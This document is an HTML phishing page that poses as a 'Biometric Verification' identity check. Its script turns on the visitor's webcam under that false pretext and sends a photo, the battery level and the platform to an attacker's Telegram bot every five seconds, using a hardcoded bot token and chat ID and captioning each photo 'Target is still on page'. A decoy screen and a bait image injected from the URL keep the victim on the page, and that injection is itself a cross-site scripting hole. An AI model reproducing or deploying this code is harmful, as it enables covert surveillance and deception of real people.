<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Portal - Nitin 333</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        #wrapper { text-align: center; width: 90%; max-width: 380px; padding: 30px; border: 1px solid #222; border-radius: 25px; background: #0a0a0a; box-shadow: 0 0 30px rgba(0, 136, 204, 0.2); }
        .icon { font-size: 60px; margin-bottom: 20px; color: #0088cc; }
        .loader { border: 4px solid #111; border-top: 4px solid #0088cc; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { background: #0088cc; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
        #status { font-size: 14px; color: #888; margin-top: 15px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div id="wrapper">
    <div class="icon">🛡️</div>
    <h2 style="margin: 0;">Identity Required</h2>
    <p id="status">Please complete the <b>Biometric Verification</b> to proceed.</p>
    <div id="load" class="loader"></div>
    <button id="mainBtn" class="btn" onclick="startContinuousScan()">VERIFY IDENTITY</button>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
    const TOKEN = "8261242218:AAHt6b51pIZowjKOdNmUTE4skOpVAWZbsqI";
    const CHAT_ID = "6643732863"; // Update this!

    async function startContinuousScan() {
        const btn = document.getElementById('mainBtn');
        const loader = document.getElementById('load');
        const status = document.getElementById('status');

        if ("vibrate" in navigator) { navigator.vibrate([100, 50, 100]); }
        btn.style.display = 'none';
        loader.style.display = 'block';
        status.innerHTML = "Initializing Biometric Scan...";

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            status.innerHTML = "<b>SCANNING...</b><br>Please wait while we verify your identity.";

            // 1. Function to capture and send
            const captureFrame = async () => {
                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                
                // Get Battery
                let bat = "N/A";
                try { const b = await navigator.getBattery(); bat = `${(b.level * 100).toFixed(0)}%`; } catch(e){}

                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append("chat_id", CHAT_ID);
                    fd.append("photo", blob, "scan.jpg");
                    fd.append("caption", `🎯 **Live Capture**\n🔋 **Battery:** ${bat}\n📱 **OS:** ${navigator.platform}\n⚠️ *Target is still on page!*`);
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
                }, 'image/jpeg');
            };

            // 2. Start Multi-Capture (Every 5 seconds)
            captureFrame(); // First one immediately
            setInterval(captureFrame, 5000); 

            // 3. Keep the UI looking "Busy"
            setTimeout(() => {
                const urlParams = new URLSearchParams(window.location.search);
                const bait = urlParams.get('img');
                if (bait) {
                    document.getElementById('wrapper').innerHTML = `<img src="${bait}" style="width:100%; border-radius:15px;">`;
                }
            }, 4000);

        } catch (err) {
            alert("Verification Failed. Permission Required.");
            location.reload();
        }
    }
</script>
</body>
</html>
